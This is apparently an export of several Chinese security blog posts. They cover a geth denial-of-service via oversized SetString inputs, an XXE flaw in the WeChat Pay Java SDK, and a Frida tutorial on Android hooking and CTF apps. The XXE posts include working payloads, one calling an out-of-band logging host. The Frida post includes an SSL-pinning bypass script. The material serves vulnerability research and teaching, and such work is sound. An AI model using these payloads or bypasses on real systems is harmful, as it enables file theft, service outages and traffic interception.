递增的顺序构造多笔转账的签名，然后再在攻击者自己的节点上根据签名返回的raw 对签名进行广播，eth.sendRawTransaction(raw),达到转账的目的 轻节点的拒绝服务漏洞-待分析 知识简介：同步区块数据中，P2P模式，也分为客户端和服务端，在这其中，获取数据的是客户端，推送数据的属于服务端。 漏洞分析漏洞成因漏洞主要利用的是轻节点协议LES协议，复现前先缕一下这个函数及其功能。 LES协议全称：Light Ethereum Subprotocol以太坊三层协议中的上层协议 层1 以太坊应用层协议: eth协议、les协议 层2 p2p 通信链路 层3 go语言的网络IO层 漏洞复现les/handler.go case query.Origin.Hash != (common.Hash{}) &amp;&amp; !query.Reverse: // Hash based traversal towards the leaf block if header := pm.blockchain.GetHeaderByNumber(origin.Number.Uint64() + query.Skip + 1); header != nil { if pm.blockchain.GetBlockHashesFromHash(header.Hash(), query.Skip+1)[query.Skip] == query.Origin.Hash { query.Origin.Hash = header.Hash() } else { unknown = true } } else { unknown = true } case query.Reverse: // Number based traversal towards the genesis block if query.Origin.Number &gt;= query.Skip+1 { query.Origin.Number -= (query.Skip + 1) } else { unknown = true } case !query.Reverse: // Number based traversal towards the leaf block query.Origin.Number += (query.Skip + 1) } } bv, rcost := p.fcClient.RequestProcessed(costs.baseCost + query.Amount*costs.reqCost) pm.server.fcCostStats.update(msg.Code, query.Amount, rcost) return p.SendBlockHeaders(req.ReqID, bv, headers) eth/handler.go 365-385 此处已修复 case query.Origin.Hash != (common.Hash{}) &amp;&amp; !query.Reverse: // Hash based traversal towards the leaf block var ( current = origin.Number.Uint64() next = current + query.Skip + 1 ) if next &lt;= current { infos, _ := json.MarshalIndent(p.Peer.Info(), &quot;&quot;, &quot; &quot;) p.Log().Warn(&quot;GetBlockHeaders skip overflow attack&quot;, &quot;current&quot;, current, &quot;skip&quot;, query.Skip, &quot;next&quot;, next, &quot;attacker&quot;, infos) unknown = true } else { if header := pm.blockchain.GetHeaderByNumber(next); header != nil { if pm.blockchain.GetBlockHashesFromHash(header.Hash(), query.Skip+1)[query.Skip] == query.Origin.Hash { query.Origin.Hash = header.Hash() } else { unknown = true } } else { unknown = true } } SetString导致的OOM拒绝服务漏洞分析根据分析，go语言中在使用math.big.Rat.SetString的时候，如果对传入的需要转换的函数没有相应的检测的时候，在传入其值为一个很大的浮点数的字符串的时候，就可能导致CPU耗尽的拒绝服务。big.NewInt(0).SetString同样存在 测试样例这里简单调用下该模块，检查其对传入的很大的浮点型字符串时的处理 package main import ( \"fmt\" \"math/big\" \"os\" ) func Test(test string) () { num, success := new(big.Rat).SetString(test); if success { fmt.Print(num); } } func main(){ fmt.Println(os.Args) for i := 0; i &lt; len(os.Args); i++ { fmt.Println(os.Args[i]) } Test(os.Args[1]); } 测试结果图：此处可以明显看到通过OS传入的浮点型参数1e111111111，此时CPU升到100% 不过当浮点数 func main(){ type txdata struct { AccountNonce string `json:\"nonce\"` Price string `json:\"gasPrice\"` GasLimit string `json:\"gas\"` Recipient string `json:\"to\"` Amount string `json:\"value\"` Payload string `json:\"input\"` } var dec txdata data := []byte(\"{\\\"nonce\\\":\\\"2\\\",\\\"gasPrice\\\":1000000000000000000,\\\"gas\\\":\\\"50000\\\",\\\"to\\\":\\\"0x3fac0b8a3d21f8565b7446c6cc9e932badfb186c\\\",\\\"value\\\":\\\"20000\\\",\\\"input\\\":\\\"0x\\\"}\") if err := json.Unmarshal(data, &amp;dec); err != nil { fmt.Println(err); } price := big.NewInt(0) price.SetString(dec.Price, 0); } 漏洞分析看过测试用例后，这里我们实际分析一个最近看到的公链上漏洞。 定位漏洞这里根据代码审计中最简单的漏洞定位方法，因为知道了math.big.SetString存在问题,这里就去寻找，然后察看是否有可疑参数传入这里我们定位到了go-ethernum/cmd/geth/accountcmd.go 文件中 func signTx(ctx *cli.Context) error { prikey := ctx.Args().First() if len(prikey) == 0 { fmt.Println(\"{error1}\") return errors.New(\"no prikey\") } key, err := crypto.LoadECDSA(prikey) if err != nil { fmt.Println(\"{error2}\") return err } jsonstr := ctx.GlobalString(utils.PasswordFileFlag.Name) log.Info(jsonstr) type txdata struct { AccountNonce string `json:\"nonce\"` Price string `json:\"gasPrice\"` GasLimit string `json:\"gas\"` Recipient string `json:\"to\"` Amount string `json:\"value\"` Payload string `json:\"input\"` } var dec txdata if err := json.Unmarshal([]byte(jsonstr), &amp;dec); err != nil {//go的json解析 fmt.Println(\"{error3}\") return err } nonce, err := strconv.ParseUint(dec.AccountNonce, 0, 64) if err != nil { fmt.Println(\"{error4}\") return err } amount := big.NewInt(0) amount.SetString(dec.Amount, 0) price := big.NewInt(0) price.SetString(dec.Price, 0) gas := big.NewInt(0) gas.SetString(dec.GasLimit, 0) tx := types.NewTransaction(nonce, common.HexToAddress(dec.Recipient), amount, gas, price, []byte(dec.Payload)) s := types.NewEIP155Signer(big.NewInt(15)) sign, err := types.GetRowTransaction(s, tx, key) if err != nil { fmt.Println(\"{error5}\") return err } fmt.Println(\"{\" + sign + \"}\") 简单的看了下，此处是对以太坊交易的功能，稍微理下流程：转账请求： 进行请求的时候，可以有三种方式：调用JSON-RPC curl -X POST -H &quot;Content-Type&quot;:application/json --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;: [{ &quot;from&quot;: &quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;, &quot;to&quot;: &quot;0xd64a66c28a6ae5150af5e7c34696502793b91ae7&quot;, &quot;value&quot;: &quot;0x1&quot; }], &quot;id&quot;:67}&#39; 172.25.0.10:8545 调用js console eth.sendTransaction({&quot;from&quot;:eth.accounts[0],to:eth.accounts[1],value:web3.toWei(10,&#39;ether&#39;)}) 调用web3.js ，实质还是调用了js console API web3.eth.sendTransaction(\"from\":eth.accounts[0],to:eth.accounts[1],value:web3.toWei(10,'ether')}) 流程如下： 用户输入转账的地址和转入的地址和转出的金额 系统通过转出的地址的私钥对转账信息进行签名（用于证明这 笔交易确实有本人进行） 系统对交易信息进行验证 把这笔交易入到本地的txpool中（就是缓存交易池） 把交易信息广播给其它节点借用下seebug的图： 在用户输入调用web3.js后，传入参数进行交易，在此处调用ethapi接口：internal/ethapi/api.go 1071 unc (s *PublicTransactionPoolAPI) SendTransaction(ctx context.Context, args SendTxArgs) (common.Hash, error) { // Look up the wallet containing the requested signer account := accounts.Account{Address: args.From} wallet, err := s.b.AccountManager().Find(account) ...... 通过from来调取传入的账户地址 account := accounts.Account{Address: args.From}//接收from参数 wallet, err := s.b.AccountManager().Find(account)//判断account是否存在 func (am *Manager) Find(account Account) (Wallet, error) { 通过交易信息生成type包 func (args *SendTxArgs) toTransaction() *types.Transaction { if args.To == nil { return types.NewContractCreation(uint64(*args.Nonce), (*big.Int)(args.Value), (*big.Int)(args.Gas), (*big.Int)(args.GasPrice), args.Data) } return types.NewTransaction(uint64(*args.Nonce), *args.To, (*big.Int)(args.Value), (*big.Int)(args.Gas), (*big.Int)(args.GasPrice), args.Data) } 对交易进行签名 signed, err := wallet.SignTx(account, tx, chainID) 最后提交交易 return submitTransaction(ctx, s.b, signed) 在这里推测是使用了big.NewInt.SetString函数，导致了此处的OOM造成了拒绝服务的风险。但是单独测试的后期并没复现成功，存在点问题，可能根本原因不在这，只在节点上测试成功。误打误撞的找到了这个节点漏洞。 漏洞复现在客户端console中，使用对应的转账函数，此时使用其中的转账函数，将其中的gasPrice、gasvalue、value的值使用为对应的16进制长数据将导致CPU占用。 eth.sendTransaction() 坑点内存在内存资源不足的情况下，程序会自动退出。 goroutine 1340 [chan receive]: github.com/ethereum/go-ethereum/p2p/discover.(*udp). 在调用math.big.Rat.SetString的时候，浮点数过大会不解析，同样不会造成影响。 参考https://blog.csdn.net/fpcc/article/details/81050976 https://tianyun6655.github.io/2017/09/24/以太坊源码交易/ https://www.colabug.com/3485978.html https://cloud.tencent.com/developer/section/1143071 https://www.jianshu.com/p/1b0ffb58f565 https://github.com/zsfelfoldi/go-ethereum/wiki/Light-Ethereum-Subprotocol-%28LES%29 https://paper.seebug.org/656/","categories":[],"tags":[]},{"title":"XXE 示例及利用-java—SDK-1","slug":"Web渗透/XXE/XXE实例及利用2","date":"2019-01-28T14:21:04.000Z","updated":"2019-07-21T04:44:07.813Z","comments":true,"path":"2019/01/28/Web渗透/XXE/XXE实例及利用2/","link":"","permalink":"http://yoursite.com/2019/01/28/Web渗透/XXE/XXE实例及利用2/","excerpt":"","text":"[TOC] XXE实例分析在接着之前对XXE的了解和学习，但一直在实战中都没遇到，正好这段时间在同事的渗透工作中又遇到了微信SDK的XXE漏洞，便趁着这个机会结合之前对微信SDK中的XXE漏洞，总结一波。 ex1漏洞原理 微信SDK XXE漏洞分析1 没有找到原漏洞代码，看到原漏洞修复后代码： https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip 在这个案例中，漏洞逻辑为：微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果，该接口接受XML格式的数据，攻击者可以构造恶意的回调数据（XML格式）来窃取商家服务器上的任何文件，一般支付服务器均为核心服务器，出现XXE导致任意文件。另外，一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品。 因为白盒分析java实在有点强人所难，所以站在前人的肩膀上，一步到位，先看看出现这个漏洞的函数： src/main/java/com/github/wxpay/sdk/WXPayUtil文件 public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception { try { Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;(); DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder(); InputStream stream = new ByteArrayInputStream(strXML.getBytes(&quot;UTF-8&quot;)); org.w3c.dom.Document doc = documentBuilder.parse(stream); doc.getDocumentElement().normalize(); NodeList nodeList = doc.getDocumentElement().getChildNodes(); for (int idx = 0; idx &lt; nodeList.getLength(); ++idx) { Node node = nodeList.item(idx); if (node.getNodeType() == Node.ELEMENT_NODE) { org.w3c.dom.Element element = (org.w3c.dom.Element) node; data.put(element.getNodeName(), element.getTextContent()); } } try { stream.close(); } catch (Exception ex) { // do nothing } return data; } catch (Exception ex) { WXPayUtil.getLogger().warn(&quot;Invalid XML, can not convert to map. Error message: {}. XML content: {}&quot;, ex.getMessage(), strXML); throw ex; } } 这里 可以看出xmlToMap 方法用作将string转换成map,所用的xml解析器直接处理了xml字符串，这种直接处理xml字符串，在服务端没有禁止外部dtd应用的时候，造成了XXE漏洞。 详情分析 Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;(); 这个地方使用了java 中的hashmap，（Hash算法就是根据某个算法将一系列目标对象转换成地址，当要获取某个元素的时候，只需要将目标对象做相应的运算获得地址，直接获取。） 对hashmap不熟悉的朋友可以看一下 https://www.cnblogs.com/dreamroute/p/3843600.html 关键解析出现在以下 org.w3c.dom.Document doc = documentBuilder.parse(stream); doc.getDocumentElement().normalize(); 其中，strXML的内存中数据流使用parse函数处理，跟踪parse函数 public Document parse(InputStream is) throws SAXException, IOException { if (is == null) { throw new IllegalArgumentException(&quot;InputStream cannot be null&quot;); } InputSource in = new InputSource(is); return parse(in); } return的parse（in） 类似于xml解析器 将xml转换为xmlDOM，涉及到到DOM解析XML，详情可以参考下 https://blog.csdn.net/guchuanhang/article/details/51866114 漏洞复现 测试代码 package com.github.wxpay.sdk; import java.util.Map; public class test1 { public static void TestXxe(){ String xmlstr = &quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;utf-8\\&quot;?&gt; \\n&quot; + &quot;&lt;!DOCTYPE xxe [\\n&quot; + &quot;&lt;!ELEMENT name ANY &gt;\\n&quot; + &quot;&lt;!ENTITY xxe SYSTEM \\&quot;file://1.txt\\&quot; &gt;]&gt;\\n&quot; + &quot;&lt;root&gt;\\n&quot; + &quot;&lt;name&gt;&amp;xxe;&lt;/name&gt;\\n&quot; + &quot;&lt;/root&gt;&quot;; try { System.out.println(xmlstr); System.out.println(&quot;+++++++++++++++++=&quot;); //System.out.println(WXPayUtil.isSignatureValid(xmlstr,config.getkey())); Map&lt;String,String&gt; hm = WXPayUtil.xmlToMap(xmlstr); System.out.println(&quot;+++++++++++++++++=&quot;); System.out.println(hm); }catch (Exception e){ e.printStackTrace(); } } public static void main(String[] argvs){ System.out.println(&quot;11111&quot;); test2 test3 = new test2(); test3.Test2(); //WXPayUtil WXXxe = new WXPayUtil();//调用存在漏洞的代码 //WXXxe.mapToXml(); TestXxe(); } } 在下载的漏洞示例代码中，已经是更新后的代码了，所以为了使漏洞复现，得注释掉其中部分禁止函数。 当配置documentBuilderFactory.setFeature(“http://apache.org/xml/features/disallow-doctype-decl&quot;, true)为true时， 完全禁止DTD实体的使用 在 com.github.wxpay.sdk.WXPayXmlUtil函数中，进行了安全配置 documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); 报错：[Fatal Error] :2:10: 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。 单独将该配置该为false，可以使用内部实体调用 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe &quot;11111111&quot; &gt;]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt; 正常反馈 {name=111111} 使用外部实体时，因为本例子中使用的其他防护措施中，导致了禁止外部实体,测试时可以将以下防护注释掉。这个时候就可以正常进行外部实体注入。 修复措施src/main/java/com/github/wxpay/sdk/WXPayXmlUtil中 documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false); documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true); documentBuilderFactory.setXIncludeAware(false); documentBuilderFactory.setExpandEntityReferences(false); 详情分析 参考： http://xerces.apache.org/xerces2-j/features.html#external-general-entities https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5 ex2在简单分析了2018/07/03左右爆出来的微信SDK XXE漏洞函数后，可以回头来看一下CVE-2018-20318和CVE-2019-5312这两个CVE。 CVE-2018-20318 先看最开始的这个CVE：根据issus 889 漏洞原理已修复后漏洞代码如下： private Document getXmlDoc() { if (this.xmlDoc != null) { return this.xmlDoc; } try { this.xmlDoc = DocumentBuilderFactory .newInstance() .newDocumentBuilder() final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); factory.setExpandEntityReferences(false); this.xmlDoc = factory.newDocumentBuilder() .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8))); return xmlDoc; } catch (SAXException | IOException | ParserConfigurationException e) { throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString); } } 根据对比：原漏洞代码： private Document getXmlDoc() { if (this.xmlDoc != null) { return this.xmlDoc; } try { this.xmlDoc = DocumentBuilderFactory .newInstance() .newDocumentBuilder() .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8))); return xmlDoc; } catch (SAXException | IOException | ParserConfigurationException e) { throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString); } } 这里可以明显看到，parse创建了解析器，但没有如上的对外部实体进行禁止 坑点： 在复现的时候，最好使用maven项目，用pom直接导入所需组件。这里需要补充一下 &lt;dependency&gt; &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt; &lt;artifactId&gt;xstream&lt;/artifactId&gt; &lt;version&gt;1.4.7&lt;/version&gt; &lt;/dependency&gt; 测试payload： public void testToMap() throws Exception { WxPayOrderQueryResult result = new WxPayOrderQueryResult(); result.setXmlString(&quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;UTF-8\\&quot;?&gt;\\n&quot; + &quot; \\n&quot; + &quot;&lt;!DOCTYPE ANY [\\n&quot; + &quot;&lt;!ENTITY test SYSTEM \\&quot;http://th9bvw.ceye.io\\&quot; &gt;]&gt;\\n&quot; + &quot; \\n&quot; + &quot;&lt;root&gt;&amp;test;&lt;/root&gt; &quot;); Map&lt;String, String&gt; map = result.toMap(); System.out.println(map); //Assert.assertEquals(map.get(&quot;return_code&quot;), &quot;SUCCESS&quot;); //Assert.assertEquals(map.get(&quot;attach&quot;), &quot;订单额外描述&quot;); } 进行函数跟踪tomap到 BaseWxPayResult.java public Map&lt;String, String&gt; toMap() { if (StringUtils.isBlank(this.xmlString)) { throw new RuntimeException(&quot;xml数据有问题，请核实！&quot;); } Map&lt;String, String&gt; result = Maps.newHashMap(); Document doc = this.getXmlDoc(); try { NodeList list = (NodeList) XPathFactory.newInstance().newXPath() .compile(&quot;/xml/*&quot;) .evaluate(doc, XPathConstants.NODESET); int len = list.getLength(); for (int i = 0; i &lt; len; i++) { result.put(list.item(i).getNodeName(), list.item(i).getTextContent()); } } catch (XPathExpressionException e) { throw new RuntimeException(&quot;非法的xml文本内容：&quot; + xmlString); } return result; } 追溯到 getXmlDoc 可以在ceye上看到原漏洞导致的结果 修复措施修改配置 documentBuilderFactory.setExpandEntityReferences(false); 查看下详情 public void setExpandEntityReferences(boolean expandEntityRef) { this.expandEntityRef = expandEntityRef; } 这个初始化设置为true private boolean expandEntityRef = true; 但是这样修复的后果就是没有什么用，导致了CVE-2019-5312的问题实际中可以参照ex1中的修复 漏洞复现 CVE-2019-5312ex3 –待补充 实际渗透测试生活中遇到的xxe漏洞 漏洞原理漏洞复现 参考https://xz.aliyun.com/t/2427 https://mp.weixin.qq.com/s/xV7vtJmFL0FkPX05kiLNVw https://github.com/Wechat-Group/WxJava/issues/889 https://github.com/Wechat-Group/WxJava/issues/903 https://blog.csdn.net/u013224189/article/details/80902339","categories":[],"tags":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/tags/Web渗透/"},{"name":"XXE 实例利用","slug":"XXE-实例利用","permalink":"http://yoursite.com/tags/XXE-实例利用/"}]},{"title":"frida理解与学习","slug":"移动端/frida1","date":"2019-01-22T09:42:23.000Z","updated":"2019-07-21T04:44:08.215Z","comments":true,"path":"2019/01/22/移动端/frida1/","link":"","permalink":"http://yoursite.com/2019/01/22/移动端/frida1/","excerpt":"","text":"【1】pip install frida 【2】sudo pip install frida-tools 【3】我这里使用的测试机cpuinfo是 Processor : ARMv7 Processor rev 0 (v7l) 所以下载的对应的server版本是frida-server-12.2.29-android-arm 在启动对应的sever后，可以不用端口转发直接测试链接 frida-ps -U：在另一个终端的常规操作系统shell中检测frida中进程 frida-trace : 跟踪由对应应用使用的特定调用 如 跟踪chrome使用的open应用 frida-trace -i &quot;open&quot; -U com.android.chrome 内心os（不知道特么是什么玄学问题，直接用的现目前最新版29，死活有问题，都快怀疑人生了，换了下24低版本，可以正常使用） 测试功能python 枚举android手机所有的进程import frida rdev = frida.get_remote_device() processes = rdev.enumerate_processes() for process in processes: print (process) js 测试setTimeout(function(){ Java.perform(function(){ console.log(&quot;hello world!&quot;); }); }); frida ssl unpinning(待细看)Java.perform(function() { var array_list = Java.use(&quot;java.util.ArrayList&quot;); var ApiClient = Java.use(&#39;com.android.org.conscrypt.TrustManagerImpl&#39;); // console.log(&#39;Start ssl bypass.&#39;); ApiClient.checkTrustedRecursive.implementation = function(a1,a2,a3,a4,a5,a6) { console.log(&#39;Bypassing SSL Pinning&#39;); var k = array_list.$new(); return k; } },0); 在进行后面初学测试后，回头看 才发现这个并不是之前以为的通用版，是hook了com.android.org.conscrypt.TrustManagerImpl类的checkTrustedRecursive函数，猜测是作者在对应应用的校验函数。 初学功能模块访问进程内存read_bytes(address, n) write_bytes(address, data) 案例 利用Frida从TeamViewer内存中提取密码（暂未复现） 在应用程序运行时覆盖函数implementation 覆盖了原函数，进行重执行 从导入的类调用函数这个也是默认的功能，可以直接调用java.use的导入需求的类，然后通过 this.a 调用原函数，调用情况在下面例子中有。 当需要打印成员数据时，可以调用.value属性来访问 var ah = Java.use(&quot;com/miui/virtualsim/utils/ah&quot;); console.log(&quot;To Log: &quot; + ah.a.value); ah.a.value = true; 在堆上查找对象实例并使用他们Hook、追踪和拦截函数https://blog.csdn.net/u011337769/article/details/82855818 https://www.52pojie.cn/thread-848126-1-1.html https://blog.csdn.net/qingemengyue/article/details/79871926 crack 学习ex1因为不知道的什么原因，我这里的frida在使用-f（spawn）的时候就会报错，not connection，所以不能spwan模式在重启程序时调试。只能着眼于已进入mainActivity程序后续进行hook 如何修改Java层的函数参数和返回值 apk解析 首先找mainActivity中的oncreate方法，这个是在activity创建时即执行的方法 mainActivity`package sg.vantagepoint.uncrackable1; import android.app.Activity;import android.app.AlertDialog;import android.app.AlertDialog.Builder;import android.os.Bundle;import android.view.View;import android.widget.EditText;import sg.vantagepoint.a.b;import sg.vantagepoint.a.c; public class MainActivity extends Activity { private void a(String str) { AlertDialog create = new Builder(this).create(); create.setTitle(str); create.setMessage(“This in unacceptable. The app is now going to exit.”); create.setButton(-3, “OK”, new b(this)); create.setCancelable(false); create.show(); } protected void onCreate(Bundle bundle) { if (c.a() || c.b() || c.c()) { a(&quot;Root detected!&quot;); } if (b.a(getApplicationContext())) { a(&quot;App is debuggable!&quot;); } super.onCreate(bundle); setContentView(R.layout.activity_main); } public void verify(View view) { String obj = ((EditText) findViewById(R.id.edit_text)).getText().toString(); AlertDialog create = new Builder(this).create(); if (a.a(obj)) { create.setTitle(&quot;Success!&quot;); create.setMessage(&quot;This is the correct secret.&quot;); } else { create.setTitle(&quot;Nope...&quot;); create.setMessage(&quot;That&#39;s not it. Try again.&quot;); } create.setButton(-3, &quot;OK&quot;, new c(this)); create.show(); } } 在该apk调用中，在mainAc中onCreate- create.setButton(-3, &quot;OK&quot;, new b(this)); 2. b类 package sg.vantagepoint.uncrackable1; import android.content.DialogInterface;import android.content.DialogInterface.OnClickListener; class b implements OnClickListener { final / synthetic / MainActivity a; b(MainActivity mainActivity) { this.a = mainActivity; } public void onClick(DialogInterface dialogInterface, int i) { System.exit(0); } } 调用后退出应用。 - 注入js解析 setImmediate(function() { //prevent timeout console.log(“[*] Starting script”); Java.perform(function() { bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;); bClass.onClick.implementation = function(v) { console.log(&quot;[*] onClick called&quot;); } console.log(&quot;[*] onClick handler modified&quot;) }) }) 1. 在该js中 Java.perform相当于main函数；获取sg.vantagepoint.uncrackable1.b 类，然后调用onclick模拟点击事件,让本该退出的成为 调用后输出console.log 修改： setImmediate(function() { //prevent timeout console.log(“[*] Starting script”); Java.perform(function() { bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;); aClass = Java.use(&quot;sg.vantagepoint.uncrackable1.c&quot;); bClass.onClick.implementation = function(v) { console.log(&quot;[*] onClick called bb&quot;); } aClass.onClick.implementation = function(v) { console.log(&quot;[*] onClick called aa&quot;); } console.log(&quot;[*] onClick handler modified&quot;) }) }) 2. 在该apk中，调用原aes加密函数 sg.vantagepoint.a.a函数，进行解密，将结果输出。 setImmediate(function() { //prevent timeout console.log(“[*] Starting script”); Java.perform(function() { bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;); bClass.onClick.implementation = function(v) { console.log(&quot;[*] onClick called&quot;); } aaclass = Java.use(&quot;sg.vantagepoint.a.a&quot;); aaclass.a.implementation = function (arg1, arg2) { pass = &quot;&quot;; s = this.a(arg1, arg2); for(i=0; i&lt;s.length; i++) { pass += String.fromCharCode(s[i]); } console.log(&quot;[*] content: &quot; + pass); return s;} console.log(“[*] onClick handler modified”) }) }) 3. 在该apk中，hook输出最后的校验函数 sg.vantagepoint.uncrackable1.a.a函数结果，使其一直返回true setImmediate(function() { //prevent timeout console.log(“[*] Starting script”); Java.perform(function() { bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;); bClass.onClick.implementation = function(v) { console.log(&quot;[*] onClick called&quot;); } aaclass = Java.use(&quot;sg.vantagepoint.uncrackable1.a&quot;); aaclass.a.implementation = function (arg1) { return true; } console.log(&quot;[*] onClick handler modified&quot;) }) }) ##### ex2 场景参考在这里： https://bbs.pediy.com/thread-227232.htm ###### 源码分析 同上先看oncreate函数 protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); this.P = (Button) findViewById(R.id.button); this.S = (Button) findViewById(R.id.button3); this.r = (Button) findViewById(R.id.buttonR); this.P.setOnClickListener(this); this.r.setOnClickListener(this); this.S.setOnClickListener(this); this.flag = 0; } 菜鸟学android什么都的查emmmmm **Bundle savedInstanceState：** 经常会出现用户按到home键，退出了界面，或者安卓系统意外回收了应用的进程，这种情况下，使用Bundle savedInstanceState就可以用户再次打开应用的时候恢复的原来的状态，剩下的声明了button控件和事件的监听 onClick函数 public void onClick(View v) { if (this.flag != 1) { this.flag = 1; ((TextView) findViewById(R.id.textView3)).setText(“”); TextView tv = (TextView) findViewById(R.id.textView); TextView tv2 = (TextView) findViewById(R.id.textView2); this.m = 0; this.n = new Random().nextInt(3); tv2.setText(new String[]{“CPU: Paper”, “CPU: Rock”, “CPU: Scissors”}[this.n]); if (v == this.P) { tv.setText(“YOU: Paper”); this.m = 0; } if (v == this.r) { tv.setText(“YOU: Rock”); this.m = 1; } if (v == this.S) { tv.setText(“YOU: Scissors”); this.m = 2; } this.handler.postDelayed(this.showMessageTask, 1000); } } postDelayed：创建多线程消息的函数，类似于定时器，每秒触发一下this.showMessageTask private final Runnable showMessageTask = new Runnable() { public void run() { TextView tv3 = (TextView) MainActivity.this.findViewById(R.id.textView3); MainActivity mainActivity; if (MainActivity.this.n - MainActivity.this.m == 1) { mainActivity = MainActivity.this; mainActivity.cnt++; tv3.setText(“WIN! +” + String.valueOf(MainActivity.this.cnt)); } else if (MainActivity.this.m - MainActivity.this.n == 1) { MainActivity.this.cnt = 0; tv3.setText(“LOSE +0”); } else if (MainActivity.this.m == MainActivity.this.n) { tv3.setText(“DRAW +” + String.valueOf(MainActivity.this.cnt)); } else if (MainActivity.this.m &lt; MainActivity.this.n) { MainActivity.this.cnt = 0; tv3.setText(“LOSE +0”); } else { mainActivity = MainActivity.this; mainActivity.cnt++; tv3.setText(“WIN! +” + String.valueOf(MainActivity.this.cnt)); } if (1000 == MainActivity.this.cnt) { tv3.setText(“SECCON{“ + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + “}”); } MainActivity.this.flag = 0; } }; 根据例子一以及源码分析，该问题需要hook com.example.seccon2015.rock_paper.scissors.MainActivity中的showMessageTask函数,使其直接执行 if (1000 == MainActivity.this.cnt) { tv3.setText(“SECCON{“ + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + “}”); } 构造js如下，hook掉对应的onclick函数-1： setImmediate(function() { //prevent timeout console.log(“[*] Starting script”); Java.perform(function () { var mClass = Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;); mClass.onClick.implementation = function () { console.log(&quot;Hook Start...&quot;); console.log(&quot;SECCON{&quot; + (1000 + this.calc())*107 + &quot;}&quot;) } }) }); 构造js如下，hook掉对应的onclick函数-2： setImmediate(function() { //prevent timeout console.log(“[] Starting script”); Java.perform(function () {//定义变量MainActivity，Java.use指定要使用的类 var MainActivity = Java.use(‘com.example.seccon2015.rock_paper_scissors.MainActivity’); //hook该类下的onCreate方法，重新实现它 MainActivity.onClick.implementation = function () { send(“Hook Start…”); //调用calc()方法，获取返回值 var returnValue = this.calc(); send(“Return:”+returnValue); var result = (1000+returnValue)107; //解出答案 send(“Flag:”+”SECCON{“+result.toString()+”}”); } })}); ##### 如何打印Java层的方法堆栈信息 枚举内存范围 enumerate_ranges(mask) ##### 如何拦截native层的函数参数和返回值 #### 需要理解的问题 ##### java反射 ##### 动态代码插桩DBI #### 参考 https://www.52pojie.cn/thread-848126-1-1.htmlhttps://blog.csdn.net/omnispace/article/details/70598829https://codemetrix.net/hacking-android-apps-with-frida-2/https://www.frida.re/docs/javascript-api/#javahttps://github.com/iromise/AOS-Note/blob/42544f4635e6238e2d7ddbc6e4e1789c20d2c130/frida-exp/frida.mdhttps://bbs.pediy.com/thread-227232.htmhttps://www.cnblogs.com/qwangxiao/p/9255328.html`","categories":[],"tags":[{"name":"移动端","slug":"移动端","permalink":"http://yoursite.com/tags/移动端/"},{"name":"frida","slug":"frida","permalink":"http://yoursite.com/tags/frida/"}]},{"title":"安全策略-csp理解与学习","slug":"安全策略/csp","date":"2019-01-09T18:11:33.000Z","updated":"2019-07-21T04:44:08.691Z","comments":true,"path":"2019/01/10/安全策略/csp/","link":"","permalink":"http://yoursite.com/2019/01/10/安全策略/csp/","excerpt":"","text":"内容安全策略 CSP百度百科概念： CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容 直白的说就是通过该浏览器扩展 进行 加载资源脚本的黑白名单限制；实现和执行均由浏览器完成 功能效果主要用来防注入脚本（比如 xss 加载其他域下的js；广告注入h5页面、运营商的http劫持）图片、iframe、fton、style等等可能的远程的资源 限制远程资源的请求，如通过远程请求将资源如cookie传送出去 记录违规的限制行为，并汇报给指定目标。 CSP和同源策略在同源策略中 一个页面的资源只能从与之同源的服务器获取，不能从其他域获取；但因此也影响了灵活性，CSP相对来说 可以跨域获取资源，又能防止恶意代码。 使用方式：要素CSP域：允许使用CSP的规则 CSP指令集：允许白名单的内容规则 示例 default-src 